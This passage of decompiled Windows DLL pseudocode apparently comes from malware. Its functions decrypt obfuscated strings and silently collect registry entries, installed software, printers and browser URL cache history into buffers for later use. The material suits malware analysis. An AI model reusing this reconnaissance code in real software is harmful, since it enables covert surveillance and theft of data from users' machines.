// 1000606F: using guessed type int var_138C[4];

//----- (1000625A) --------------------------------------------------------
DWORD __thiscall sub_1000625A(int this, int a2)
{
  const CHAR *v3; // eax
  DWORD result; // eax
  const CHAR *v5; // eax
  FARPROC ProcAddress; // eax
  char v7; // al
  bool v8; // zf
  int v9; // [esp+10h] [ebp-18h] BYREF
  HMODULE hModule; // [esp+14h] [ebp-14h]
  int v11; // [esp+24h] [ebp-4h]
  int v12[250]; // [esp+28h] [ebp+0h] BYREF

  v9 = 1000;
  memset(v12, 0, sizeof(v12));
  v11 = 0;
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001D0E8);
  hModule = LoadLibraryA(v3);
  if ( hModule )
  {
    v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001D108);
    ProcAddress = GetProcAddress(hModule, v5);
    if ( ProcAddress && ((int (__stdcall *)(_DWORD, int, int *, int *))ProcAddress)(0, 38, v12, &v9) )
    {
      v7 = -1;
      if ( v12[0] <= 0xFFu )
        v7 = v12[0];
      v8 = v12[1] == 0;
      *(_BYTE *)(this + 11332) = v7;
      if ( !v8 )
        lstrcpynA((LPSTR)(this + 11333), (LPCSTR)v12[1], 150);
      if ( v12[2] )
        lstrcpynA((LPSTR)(this + 11484), (LPCSTR)v12[2], 200);
    }
    else
    {
      *(_DWORD *)(this + 11328) = GetLastError();
    }
    return FreeLibrary(hModule);
  }
  else
  {
    result = GetLastError();
    *(_DWORD *)(this + 11328) = result;
  }
  return result;
}

//----- (10006377) --------------------------------------------------------
DWORD __thiscall sub_10006377(int *this)
{
  int v1; // ebx
  DWORD result; // eax
  int *v4; // esi
  HANDLE hFindFile; // [esp+8h] [ebp-80h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+Ch] [ebp-7Ch] BYREF
  CHAR pszPath[264]; // [esp+14Ch] [ebp+C4h] BYREF

  v1 = 0;
  if ( !SHGetSpecialFolderPathA(0, pszPath, 19, 0)
    || (PathAddBackslashA(pszPath),
        lstrcatA(pszPath, String2),
        hFindFile = FindFirstFileA(pszPath, &FindFileData),
        hFindFile == (HANDLE)-1) )
  {
    result = GetLastError();
    this[2922] = result;
  }
  else
  {
    v4 = this + 2936;
    do
    {
      if ( lstrcmpA(FindFileData.cFileName, asc_1001D138)
        && lstrcmpA(FindFileData.cFileName, asc_1001D13C)
        && (FindFileData.dwFileAttributes & 0x10) != 0 )
      {
        lstrcpynA((LPSTR)v4 - 52, FindFileData.cFileName, 50);
        *v4 = sub_100022D7((__int64 *)&FindFileData.ftCreationTime);
        ++v1;
        v4 += 14;
      }
    }
    while ( v1 < 30 && FindNextFileA(hFindFile, &FindFileData) );
    return FindClose(hFindFile);
  }
  return result;
}

//----- (1000647E) --------------------------------------------------------
DWORD __thiscall sub_1000647E(CHAR *this)
{
  DWORD result; // eax
  CHAR *v3; // edi
  char *i; // esi
  DWORD pcbNeeded; // [esp+8h] [ebp-80h] BYREF
  DWORD pcReturned; // [esp+Ch] [ebp-7Ch] BYREF
  unsigned int v7; // [esp+10h] [ebp-78h]
  BYTE pPrinterEnum[4]; // [esp+14h] [ebp-74h] BYREF
  char v9; // [esp+18h] [ebp-70h] BYREF

  pcbNeeded = 0;
  pcReturned = 0;
  if ( EnumPrintersA(6u, 0, 4u, pPrinterEnum, 0x7530u, &pcbNeeded, &pcReturned) )
  {
    v7 = 0;
    v3 = this + 13417;
    for ( i = &v9; ; i += 12 )
    {
      result = pcReturned;
      if ( pcReturned >= 4 )
        result = 4;
      if ( v7 >= result )
        break;
      lstrcpynA(v3 - 41, *((LPCSTR *)i - 1), 40);
      if ( *(_DWORD *)i )
        lstrcpynA(v3, *(LPCSTR *)i, 20);
      if ( (i[4] & 0x10) != 0 )
        v3[21] = 1;
      ++v7;
      v3 += 63;
    }
  }
  else
  {
    result = GetLastError();
    *((_DWORD *)this + 3343) = result;
  }
  return result;
}
// 1000647E: using guessed type BYTE pPrinterEnum[4];

//----- (1000653D) --------------------------------------------------------
char __thiscall sub_1000653D(void *this, HKEY hKey)
{
  const CHAR *v2; // eax
  LSTATUS v3; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  const CHAR *v6; // eax
  int v7; // eax
  int v8; // eax
  struct _FILETIME ftLastWriteTime; // [esp+Ch] [ebp-80h] BYREF
  DWORD cchName; // [esp+14h] [ebp-78h] BYREF
  HKEY v12; // [esp+18h] [ebp-74h]
  DWORD dwIndex; // [esp+1Ch] [ebp-70h]
  unsigned int v14; // [esp+20h] [ebp-6Ch]
  HKEY phkResult; // [esp+24h] [ebp-68h] BYREF
  void *v16; // [esp+28h] [ebp-64h]
  bool v17; // [esp+2Fh] [ebp-5Dh]
  CHAR Name[264]; // [esp+30h] [ebp-5Ch] BYREF
  CHAR String[264]; // [esp+138h] [ebp+ACh] BYREF
  CHAR Src[264]; // [esp+240h] [ebp+1B4h] BYREF
  CHAR String1[264]; // [esp+348h] [ebp+2BCh] BYREF

  v16 = this;
  v12 = hKey;
  phkResult = 0;
  v14 = 0;
  dwIndex = 0;
  cchName = 260;
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001D2C0);
  v3 = RegOpenKeyExA(hKey, v2, 0, 8u, &phkResult);
  if ( !v3 )
  {
    v16 = (char *)v16 + 13679;
    do
    {
      v3 = RegEnumKeyExA(phkResult, dwIndex++, Name, &cchName, 0, 0, 0, &ftLastWriteTime);
      if ( v3 )
        break;
      memset(String1, 0, 261);
      v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001D310);
      lstrcpynA(String1, v4, 260);
      lstrcatA(String1, asc_1001D2BC);
      lstrcatA(String1, Name);
      memset(String, 0, 261);
      v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001D35C);
      v17 = sub_1000273E(v12, String1, v5, (LPBYTE)String, 261);
      memset(Src, 0, 261);
      v6 = (const CHAR *)sub_1000C0E0((int)&unk_1001D384);
      LOBYTE(v3) = sub_1000273E(v12, String1, v6, (LPBYTE)Src, 260);
      LOBYTE(v3) = v17 | v3;
      if ( (_BYTE)v3 )
      {
        if ( (unsigned int)lstrlenA(String) >= 0x33 )
          v7 = 51;
        else
          v7 = lstrlenA(String);
        memcpy((char *)v16 - 51, String, v7);
        if ( (unsigned int)lstrlenA(Src) >= 0x33 )
          v8 = 51;
        else
          v8 = lstrlenA(Src);
        LOBYTE(v3) = (unsigned __int8)memcpy(v16, Src, v8);
        ++v14;
        v16 = (char *)v16 + 102;
      }
      cchName = 260;
    }
    while ( v14 < 5 );
  }
  if ( phkResult )
    LOBYTE(v3) = RegCloseKey(phkResult);
  return v3;
}

//----- (10006750) --------------------------------------------------------
char __thiscall sub_10006750(char *this, int a2, HKEY hKey, const CHAR *a4, int a5, int a6)
{
  DWORD v6; // ebx
  LSTATUS v7; // eax
  int v8; // esi
  char *v9; // edi
  const CHAR *v10; // eax
  char result; // al
  const CHAR *v12; // eax
  const CHAR *v13; // eax
  DWORD cbData; // [esp+14h] [ebp-60h] BYREF
  LPCSTR lpValueName; // [esp+18h] [ebp-5Ch]
  BYTE Data[2]; // [esp+1Ch] [ebp-58h] BYREF
  char v18[80]; // [esp+1Eh] [ebp-56h] BYREF

  lpValueName = a4;
  *(_WORD *)Data = 0;
  memset(v18, 0, sizeof(v18));
  v6 = 40;
  cbData = 40;
  v7 = RegQueryValueExA(hKey, a4, 0, 0, Data, &cbData);
  if ( v7 == 234 || !v7 )
  {
    if ( v7 )
    {
      v8 = 1400 * a6 + 272 * a5;
      v9 = &this[v8];
      *(_DWORD *)&this[v8 + 14180] = 234;
    }
    else
    {
      if ( cbData < 0x28 )
        v6 = cbData;
      v8 = 1400 * a6 + 272 * a5;
      v9 = &this[v8];
      memcpy(&this[v8 + 14288], Data, v6);
      *(_DWORD *)&this[v8 + 14388] = cbData;
    }
    v10 = (const CHAR *)sub_1000C0E0((int)&unk_1001D3A4);
    if ( !lstrcmpA(lpValueName, v10) )
    {
      result = 1;
      *(_DWORD *)(v8 + a2 + 7572) = 1;
      return result;
    }
    v12 = (const CHAR *)sub_1000C0E0((int)&unk_1001D3C4);
    if ( !lstrcmpA(lpValueName, v12) )
    {
      *(_DWORD *)(v8 + a2 + 7572) = 2;
      return 1;
    }
    v13 = (const CHAR *)sub_1000C0E0((int)&unk_1001D3E4);
    if ( !lstrcmpA(lpValueName, v13) )
    {
      *((_DWORD *)v9 + 3612) = 3;
      return 1;
    }
  }
  return 0;
}

//----- (1000689F) --------------------------------------------------------
char __thiscall sub_1000689F(char *this, HKEY hKey)
{
  LSTATUS v2; // eax
  size_t v3; // eax
  size_t v4; // eax
  DWORD v5; // eax
  size_t v6; // eax
  size_t v7; // eax
  const char *v8; // eax
  const char *v9; // eax
  LPBYTE v10; // esi
  size_t v11; // eax
  size_t v12; // eax
  size_t v13; // eax
  DWORD v14; // edi
  const CHAR *v15; // eax
  const CHAR *v16; // eax
  char *v17; // edi
  int v18; // edi
  const CHAR *v19; // eax
  const CHAR *v20; // eax
  const CHAR *v21; // eax
  int v23; // [esp-8h] [ebp-194h]
  int v24; // [esp-8h] [ebp-194h]
  int v25; // [esp-8h] [ebp-194h]
  size_t v26; // [esp-4h] [ebp-190h]
  int v27; // [esp-4h] [ebp-190h]
  int v28; // [esp-4h] [ebp-190h]
  int v29; // [esp-4h] [ebp-190h]
  struct _FILETIME ftLastWriteTime; // [esp+Ch] [ebp-180h] BYREF
  struct _FILETIME v31; // [esp+14h] [ebp-178h] BYREF
  DWORD v32; // [esp+1Ch] [ebp-170h] BYREF
  DWORD cchName; // [esp+20h] [ebp-16Ch] BYREF
  LSTATUS v34; // [esp+24h] [ebp-168h]
  HKEY v35; // [esp+28h] [ebp-164h]
  LPCSTR lpSubKey; // [esp+2Ch] [ebp-160h]
  DWORD v37; // [esp+30h] [ebp-15Ch]
  LSTATUS v38; // [esp+34h] [ebp-158h]
  HKEY phkResult; // [esp+38h] [ebp-154h] BYREF
  HKEY v40; // [esp+3Ch] [ebp-150h] BYREF
  DWORD cbData; // [esp+40h] [ebp-14Ch] BYREF
  char *v42; // [esp+44h] [ebp-148h]
  LPBYTE lpData; // [esp+48h] [ebp-144h]
  int v44; // [esp+4Ch] [ebp-140h]
  DWORD dwIndex; // [esp+50h] [ebp-13Ch]
  HKEY v46; // [esp+54h] [ebp-138h] BYREF
  CHAR pszPath[152]; // [esp+58h] [ebp-134h] BYREF
  BYTE Data[2]; // [esp+F0h] [ebp-9Ch] BYREF
  char v49[78]; // [esp+F2h] [ebp-9Ah] BYREF
  char Destination[152]; // [esp+140h] [ebp-4Ch] BYREF
  char Str[33]; // [esp+1D8h] [ebp+4Ch] BYREF
  __int16 v52; // [esp+1F9h] [ebp+6Dh]

  v42 = this;
  v35 = hKey;
  lpSubKey = (LPCSTR)sub_1000C0E0((int)&unk_1001D140);
  phkResult = 0;
  v34 = 0;
  memset(Destination, 0, 151);
  memset(Str, 0, sizeof(Str));
  v52 = 0;
  v2 = RegOpenKeyExA(hKey, lpSubKey, 0, 8u, &phkResult);
  if ( !v2 )
  {
    LOBYTE(v2) = (_BYTE)v42 + 56;
    dwIndex = 0;
    lpData = (LPBYTE)(v42 + 14392);
    while ( (!v34 || v34 == 234) && (int)dwIndex < 3 )
    {
      ftLastWriteTime.dwLowDateTime = 0;
      ftLastWriteTime.dwHighDateTime = 0;
      v3 = strlen(Str);
      memset(Str, 0, v3);
      v4 = strlen(Destination);
      memset(Destination, 0, v4);
      cchName = 35;
      v2 = RegEnumKeyExA(phkResult, dwIndex, Str, &cchName, 0, 0, 0, &ftLastWriteTime);
      v34 = v2;
      if ( !v2 )
      {
        v5 = cchName;
        v44 = 0;
        v37 = 0;
        v38 = 0;
        v40 = 0;
        if ( cchName >= 0x23 )
          v5 = 35;
        strncpy((char *)lpData - 248, Str, v5);
        v6 = strlen(lpSubKey);
        strncpy(Destination, lpSubKey, v6);
        PathAddBackslashA(Destination);
        if ( strlen(Str) >= 0x23 )
          v7 = 35;
        else
          v7 = strlen(Str);
        strncat(Destination, Str, v7);
        PathAddBackslashA(Destination);
        v8 = (const char *)sub_1000C0E0((int)&unk_1001D1A8);
        v26 = strlen(v8);
        v9 = (const char *)sub_1000C0E0((int)&unk_1001D1E0);
        strncat(Destination, v9, v26);
        v2 = RegOpenKeyExA(v35, Destination, 0, 0x20019u, &v40);
        if ( v2 )
        {
          *((_DWORD *)lpData - 63) = v2;
        }
        else
        {
          v10 = lpData;
          while ( (!v38 || v38 == 234) && v44 < 5 )
          {
            v31.dwLowDateTime = 0;
            v31.dwHighDateTime = 0;
            v11 = strlen(Str);
            memset(Str, 0, v11);
            v32 = 35;
            v2 = RegEnumKeyExA(v40, v37, Str, &v32, 0, 0, 0, &v31);
            v38 = v2;
            if ( !v2 )
            {
              memset(pszPath, 0, 151);
              if ( strlen(Destination) >= 0x96 )
                v12 = 150;
              else
                v12 = strlen(Destination);
              strncpy(pszPath, Destination, v12);
              PathAddBackslashA(pszPath);
              if ( strlen(Str) >= 0x23 )
                v13 = 35;
              else
                v13 = strlen(Str);
              strncat(pszPath, Str, v13);
              v46 = 0;
              v2 = RegOpenKeyExA(v35, pszPath, 0, 0x20019u, &v46);
              if ( v2 )
              {
                *((_DWORD *)v10 - 53) = v2;
              }
              else
              {
                *(_WORD *)Data = 0;
                memset(v49, 0, sizeof(v49));
                v14 = 40;
                cbData = 40;
                v15 = (const CHAR *)sub_1000C0E0((int)&unk_1001D218);
                sub_100026CC(v35, pszPath, v15, v10, 0x19u, v10 + 52);
                v16 = (const CHAR *)sub_1000C0E0((int)&unk_1001D23C);
                v2 = RegQueryValueExA(v46, v16, 0, 0, Data, &cbData);
                if ( !v2 )
                {
                  if ( cbData < 0x28 )
                    v14 = cbData;
                  memcpy(v10 - 208, Data, v14);
                  v17 = v42;
                  v27 = dwIndex;
                  *((_DWORD *)v10 - 27) = cbData;
                  v23 = v44;
                  v18 = (int)(v17 + 6876);
                  v19 = (const CHAR *)sub_1000C0E0((int)&unk_1001D258);
                  LOBYTE(v2) = sub_10006750(v42, v18, v46, v19, v23, v27);
                  if ( !(_BYTE)v2 )
                  {
                    v28 = dwIndex;
                    v24 = v44;
                    v20 = (const CHAR *)sub_1000C0E0((int)&unk_1001D278);
                    LOBYTE(v2) = sub_10006750(v42, v18, v46, v20, v24, v28);
                    if ( !(_BYTE)v2 )
                    {
                      v29 = dwIndex;
                      v25 = v44;
                      v21 = (const CHAR *)sub_1000C0E0((int)&unk_1001D298);
                      LOBYTE(v2) = sub_10006750(v42, v18, v46, v21, v25, v29);
                    }
                  }
                  ++v44;
                  v10 += 272;
                }
              }
              if ( v46 )
                LOBYTE(v2) = RegCloseKey(v46);
            }
            ++v37;
          }
        }
        if ( v40 )
          LOBYTE(v2) = RegCloseKey(v40);
      }
      ++dwIndex;
      lpData += 1400;
    }
  }
  if ( phkResult )
    LOBYTE(v2) = RegCloseKey(phkResult);
  return v2;
}

//----- (10006DD4) --------------------------------------------------------
char __thiscall sub_10006DD4(char *this, HKEY hKey)
{
  int v3; // eax

  v3 = sub_1000C8E9((int)this, (int)&dword_10026C78, 1u, 0);
  if ( v3 )
  {
    if ( sub_1000C8E9((int)this, (int)&dword_10026C48, 3u, 0) )
      sub_10005CB7(this);
    else
      *((_DWORD *)this + 1720) = 123456;
    sub_1000606F(this, (int)this);
    sub_1000625A((int)this, (int)hKey);
    sub_10006377((int *)this);
    sub_1000647E(this);
    sub_1000653D(this, hKey);
    LOBYTE(v3) = sub_1000689F(this, hKey);
  }
  return v3;
}
// 10026C48: using guessed type int dword_10026C48;
// 10026C78: using guessed type int dword_10026C78;

//----- (10006E4B) --------------------------------------------------------
_DWORD *__thiscall sub_10006E4B(_DWORD *this)
{
  _DWORD *v2; // edi

  v2 = this + 2;
  this[1] = 9;
  *this = &ItfVvnfaqnlf::`vftable';
  memset(this + 2, 0, 0x226Cu);
  *v2 = this[1];
  return this;
}
// 1001D4A8: using guessed type void *ItfVvnfaqnlf::`vftable';

//----- (10006E79) --------------------------------------------------------
int sub_10006E79()
{
  return 8812;
}

//----- (10006E7F) --------------------------------------------------------
char __thiscall sub_10006E7F(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x226C )
    return 0;
  memcpy(a2, (const void *)(this + 8), 0x226Cu);
  return 1;
}

//----- (10006EA4) --------------------------------------------------------
int __stdcall sub_10006EA4(int a1)
{
  unsigned int v1; // edi
  int result; // eax
  int v3; // edx
  unsigned int *v4; // ecx

  v1 = -1;
  result = 0;
  v3 = 49;
  v4 = (unsigned int *)(a1 + 4400);
  do
  {
    if ( v1 > *v4 )
    {
      v1 = *v4;
      result = v3;
    }
    --v3;
    v4 -= 22;
  }
  while ( v3 >= 0 );
  return result;
}

//----- (10006ECF) --------------------------------------------------------
void __stdcall sub_10006ECF(char *Str, DWORD *a2, char a3)
{
  void *v4; // edi
  DWORD LastError; // eax
  void *v6; // eax
  int v7; // esi
  unsigned int v8; // ebx
  CHAR *v9; // esi
  const char *v10; // eax
  const CHAR *v11; // eax
  const CHAR *v12; // ebx
  unsigned int v13; // ecx
  size_t v14; // eax
  DWORD v15; // eax
  void *v16; // eax
  const CHAR *v17; // [esp-8h] [ebp-28h]
  char *v18; // [esp+Ch] [ebp-14h]
  HANDLE hEnumHandle; // [esp+14h] [ebp-Ch]
  DWORD cbCacheEntryInfo; // [esp+1Ch] [ebp-4h] BYREF
  char *Stra; // [esp+28h] [ebp+8h]

  cbCacheEntryInfo = 0;
  v4 = malloc(0);
  if ( Str )
    Stra = (char *)(strlen(Str) + 1);
  else
    Stra = 0;
  if ( v4 )
  {
    FindFirstUrlCacheEntryA(Str, (LPINTERNET_CACHE_ENTRY_INFOA)v4, &cbCacheEntryInfo);
    LastError = GetLastError();
    *a2 = LastError;
    if ( LastError == 122 )
    {
      v6 = malloc(cbCacheEntryInfo);
      v4 = v6;
      if ( !v6 )
        return;
      memset(v6, 0, cbCacheEntryInfo);
      hEnumHandle = FindFirstUrlCacheEntryA(Str, (LPINTERNET_CACHE_ENTRY_INFOA)v4, &cbCacheEntryInfo);
      if ( hEnumHandle )
      {
        while ( 1 )
        {
          do
          {
            v7 = sub_10006EA4((int)a2);
            v8 = sub_100022D7((__int64 *)v4 + 6);
            v9 = (CHAR *)&a2[22 * v7];
            if ( v8 > *((_DWORD *)v9 + 22) )
            {
              if ( a3 )
              {
                v10 = (const char *)sub_1000C0E0((int)&unk_1001D464);
                v18 = strstr(*((const char **)v4 + 1), v10);
                if ( v18 )
                {
                  memset(v9 + 4, 0, 0x51u);
                  *((_DWORD *)v9 + 22) = v8;
                  v11 = (const CHAR *)sub_1000C0E0((int)&unk_1001D484);
                  v12 = &v18[lstrlenA(v11)];
                  v17 = v12;
                  if ( lstrlenA(v12) >= 80 )
                    v17 = &v12[lstrlenA(v12) - 79];
                  lstrcpynA(v9 + 4, v17, 80);
                }
              }
              else
              {
                memset(v9 + 4, 0, 0x51u);
                *((_DWORD *)v9 + 22) = v8;
                v13 = strlen(*((const char **)v4 + 1)) - (_DWORD)Stra;
                v14 = 81;
                if ( v13 <= 0x51 )
                  v14 = strlen(*((const char **)v4 + 1)) - (_DWORD)Stra;
                strncpy(v9 + 4, &Stra[*((_DWORD *)v4 + 1)], v14);
              }
            }
            memset(v4, 0, cbCacheEntryInfo);
          }
          while ( FindNextUrlCacheEntryA(hEnumHandle, (LPINTERNET_CACHE_ENTRY_INFOA)v4, &cbCacheEntryInfo) );
          v15 = GetLastError();
          *a2 = v15;
          if ( v15 != 122 )
            break;
          v16 = malloc(cbCacheEntryInfo);
          v4 = v16;
          if ( v16 )
          {
            memset(v16, 0, cbCacheEntryInfo);
            if ( FindNextUrlCacheEntryA(hEnumHandle, (LPINTERNET_CACHE_ENTRY_INFOA)v4, &cbCacheEntryInfo) )
              continue;
          }
          goto LABEL_23;
        }
        *a2 = 0;
LABEL_23:
        InternetCloseHandle(hEnumHandle);
      }
    }
    if ( v4 )
      free(v4);
  }
}

//----- (100070CB) --------------------------------------------------------
void __thiscall sub_100070CB(DWORD *this, int a2)
{
  char *v3; // eax
  char *v4; // eax
  DWORD *v5; // [esp-8h] [ebp-Ch]

  v5 = this + 3;
  v3 = (char *)sub_1000C0E0((int)&unk_1001D424);
  sub_10006ECF(v3, v5, 0);
  v4 = (char *)sub_1000C0E0((int)&unk_1001D444);
  sub_10006ECF(v4, this + 1104, 1);
}

//----- (10007107) --------------------------------------------------------
_DWORD *__thiscall sub_10007107(_DWORD *this)
{
  this[1] = 8;
  *this = &YwmNvemlQyjbrqevj::`vftable';
  memset(this + 2, 0, 0x5B0u);
  return this;
}
// 1001D628: using guessed type void *YwmNvemlQyjbrqevj::`vftable';

//----- (1000712E) --------------------------------------------------------
int sub_1000712E()
{
  return 1456;
}

//----- (10007134) --------------------------------------------------------
char __thiscall sub_10007134(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x5B0 )
    return 0;
  memcpy(a2, (const void *)(this + 8), 0x5B0u);
  return 1;
}

//----- (10007159) --------------------------------------------------------
DWORD __thiscall sub_10007159(_DWORD *this)
{
  _DWORD *v1; // ebx
  const CHAR *v2; // eax
  DWORD result; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  const CHAR *v6; // eax
  FARPROC v7; // eax
  HLOCAL v8; // eax
  char *v9; // esi
  void *v10; // ebx
  FARPROC ProcAddress; // [esp+Ch] [ebp-7Ch]
  FARPROC v13; // [esp+10h] [ebp-78h]
  int v14; // [esp+14h] [ebp-74h] BYREF
  unsigned int v15; // [esp+18h] [ebp-70h]
  HMODULE hModule; // [esp+1Ch] [ebp-6Ch]
  HLOCAL hMem; // [esp+20h] [ebp-68h] BYREF
  CHAR MultiByteStr[264]; // [esp+24h] [ebp-64h] BYREF

  v1 = this;
  hMem = 0;
  v15 = 0;
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001D590);
  hModule = LoadLibraryA(v2);
  if ( hModule )
  {
    v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001D5B0);
    ProcAddress = GetProcAddress(hModule, v4);
    v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001D5D0);
    v13 = GetProcAddress(hModule, v5);
    v6 = (const CHAR *)sub_1000C0E0((int)&unk_1001D5F8);
    v7 = GetProcAddress(hModule, v6);
    if ( v7 && ProcAddress && v13 && ((int (__stdcall *)(HLOCAL *))v7)(&hMem) && (v8 = hMem) != 0 )
    {
      v9 = (char *)(v1 + 6);
      while ( 1 )
      {
        if ( *((_WORD *)v8 + 4) == 15 || *((_WORD *)v8 + 5) == 15 || *((_WORD *)v8 + 6) == 15 )
          ++v1[5];
        if ( (*((_WORD *)v8 + 4) == 1 || *((_WORD *)v8 + 5) == 1 || *((_WORD *)v8 + 6) == 1) && v15 < 0x28 )
        {
          v14 = 0;
          ((void (__stdcall *)(_DWORD, int, int, _DWORD, int *, _DWORD))ProcAddress)(
            *((_DWORD *)v8 + 1),
            1,
            16,
            0,
            &v14,
            0);
          if ( v14 )
          {
            *((_DWORD *)v9 + 8) = *(_DWORD *)(v14 + 24);
            memset(MultiByteStr, 0, 0x105u);
            WideCharToMultiByte(0, 0, *((LPCWCH *)hMem + 1), -1, MultiByteStr, 260, 0, 0);
            lstrcpynA(v9, MultiByteStr, 30);
            ((void (__stdcall *)(int, int))v13)(v14, 1);
            ++v15;
            v9 += 36;
          }
          v8 = hMem;
        }
        v10 = *(void **)v8;
        if ( *((_DWORD *)v8 + 1) )
        {
          LocalFree(*((HLOCAL *)v8 + 1));
          v8 = hMem;
        }
        LocalFree(v8);
        v8 = v10;
        hMem = v10;
        if ( !v10 )
          break;
        v1 = this;
      }
    }
    else
    {
      v1[4] = GetLastError();
    }
    return FreeLibrary(hModule);
  }
  else
  {
    result = GetLastError();
    v1[4] = result;
  }
  return result;
}

//----- (10007314) --------------------------------------------------------
int __thiscall sub_10007314(_DWORD *this)
{
  int result; // eax

  this[2] = this[1];
  result = sub_10002538();
  if ( result == 256 || (result = sub_10002538(), result == 512) || (result = sub_10002538(), result == 2048) )
  {
    this[3] = 178;
  }
  else
  {
    result = sub_1000C8E9((int)this, (int)&dword_10026C88, 6u, 0);
    if ( result )
    {
      this[3] = 176;
      return sub_10007159(this);
    }
    else
    {
      this[3] = 177;
    }
  }
  return result;
}
// 10026C88: using guessed type int dword_10026C88;

//----- (10007377) --------------------------------------------------------
_DWORD *__thiscall sub_10007377(_DWORD *this)
{
  _DWORD *v2; // edi

  v2 = this + 2;
  this[1] = 4;
  *this = &VsytBnvmghTcwrpuvav::`vftable';
  memset(this + 2, 0, 0x15Cu);
  *v2 = this[1];
  return this;
}
// 1001D74C: using guessed type void *VsytBnvmghTcwrpuvav::`vftable';

//----- (100073A5) --------------------------------------------------------
int sub_100073A5()
{
  return 348;
}

//----- (100073AB) --------------------------------------------------------
char __thiscall sub_100073AB(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x15C )
    return 0;
  memcpy(a2, (const void *)(this + 8), 0x15Cu);
  return 1;
}

//----- (100073D0) --------------------------------------------------------
char __thiscall sub_100073D0(int this, HKEY hKey)
{
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  DWORD LastError; // eax
  const CHAR *v8; // [esp-Ch] [ebp-14h]
  const CHAR *v9; // [esp-Ch] [ebp-14h]
  BYTE *v10; // [esp-8h] [ebp-10h]

  v10 = (BYTE *)(this + 12);
  v8 = (const CHAR *)sub_1000C0E0((int)&unk_1001D640);
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001D668);
  if ( !sub_1000273E(hKey, v3, v8, v10, 4) )
    *(_DWORD *)(this + 16) = GetLastError();
  v9 = (const CHAR *)sub_1000C0E0((int)&unk_1001D6B8);
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001D6D8);
  if ( !sub_1000273E(hKey, v4, v9, (LPBYTE)(this + 20), 4) )
    *(_DWORD *)(this + 24) = GetLastError();
  v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001D71C);
  LOBYTE(LastError) = sub_1000273E(HKEY_CLASSES_ROOT, v5, 0, (LPBYTE)(this + 28), 324);
  if ( !(_BYTE)LastError )
  {
    LastError = GetLastError();
    *(_DWORD *)(this + 352) = LastError;
  }
  return LastError;
}

//----- (1000747A) --------------------------------------------------------
_DWORD *__thiscall sub_1000747A(_DWORD *this, char a2)
{
  _DWORD *v3; // edi

  this[2] = 0;
  v3 = this + 3;
  this[1] = 30;
  *this = &GvbyqyaXvxcAzeulcnqg::`vftable';
  *((_BYTE *)this + 24332) = a2;
  memset(this + 3, 0, 0x5F00u);
  *v3 = this[1];
  return this;
}
// 1001DFF0: using guessed type void *GvbyqyaXvxcAzeulcnqg::`vftable';

//----- (100074B8) --------------------------------------------------------
int __thiscall sub_100074B8(_BYTE *this)
{
  return this[24332] != 0 ? 14084 : 24320;
}

//----- (100074CD) --------------------------------------------------------
char __thiscall sub_100074CD(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x5F00 )
    return 0;
  memcpy(a2, (const void *)(this + 12), 0x5F00u);
  return 1;
}

//----- (100074F2) --------------------------------------------------------
char __thiscall sub_100074F2(char *this)
{
  int v1; // edi
  LSTATUS v2; // eax
  size_t v3; // eax
  size_t v4; // eax
  int LastError; // eax
  size_t v6; // eax
  BYTE *v7; // edi
  size_t v8; // eax
  size_t v9; // eax
  const CHAR *v10; // eax
  const CHAR *v11; // eax
  const CHAR *v12; // eax
  const CHAR *v13; // eax
  const CHAR *v14; // eax
  const CHAR *v15; // eax
  const CHAR *v16; // eax
  int v17; // eax
  size_t v18; // eax
  size_t v19; // eax
  size_t v20; // eax
  size_t v21; // eax
  BYTE *v22; // edi
  const CHAR *v23; // eax
  const CHAR *v24; // eax
  BYTE *v26; // [esp-4h] [ebp-98h]
  struct _FILETIME ftLastWriteTime; // [esp+10h] [ebp-84h] BYREF
  LPCSTR v28; // [esp+18h] [ebp-7Ch]
  DWORD cchName; // [esp+1Ch] [ebp-78h] BYREF
  char *v30; // [esp+20h] [ebp-74h]
  HKEY phkResult; // [esp+24h] [ebp-70h] BYREF
  HKEY hKey; // [esp+28h] [ebp-6Ch] BYREF
  LPCSTR lpSubKey; // [esp+2Ch] [ebp-68h]
  int v34; // [esp+30h] [ebp-64h]
  DWORD dwIndex; // [esp+34h] [ebp-60h]
  char Destination[112]; // [esp+38h] [ebp-5Ch] BYREF
  CHAR pszPath[88]; // [esp+A8h] [ebp+14h] BYREF
  char Name[5]; // [esp+100h] [ebp+6Ch] BYREF
  char v39; // [esp+105h] [ebp+71h]

  v1 = (int)this;
  v30 = this;
  lpSubKey = (LPCSTR)sub_1000C0E0((int)&unk_1001D948);
  v28 = (LPCSTR)sub_1000C0E0((int)&unk_1001D9A0);
  phkResult = 0;
  dwIndex = 0;
  v34 = 0;
  v2 = RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpSubKey, 0, 8u, &phkResult);
  if ( !v2 )
  {
    memset(&pszPath[40], 0, 46);
    memset(Destination, 0, 111);
    *(_DWORD *)Name = v1 + 20440;
    while ( 1 )
    {
      if ( v34 && v34 != 234 || (int)dwIndex >= 10 )
        goto LABEL_30;
      ftLastWriteTime.dwLowDateTime = 0;
      ftLastWriteTime.dwHighDateTime = 0;
      cchName = 45;
      v3 = strlen(&pszPath[40]);
      memset(&pszPath[40], 0, v3);
      v4 = strlen(Destination);
      memset(Destination, 0, v4);
      LastError = RegEnumKeyExA(phkResult, dwIndex, &pszPath[40], &cchName, 0, 0, 0, &ftLastWriteTime);
      v34 = LastError;
      if ( LastError )
        goto LABEL_27;
      if ( strlen(&pszPath[40]) >= 0x2D )
        v6 = 45;
      else
        v6 = strlen(&pszPath[40]);
      v7 = (BYTE *)(*(_DWORD *)Name + 66);
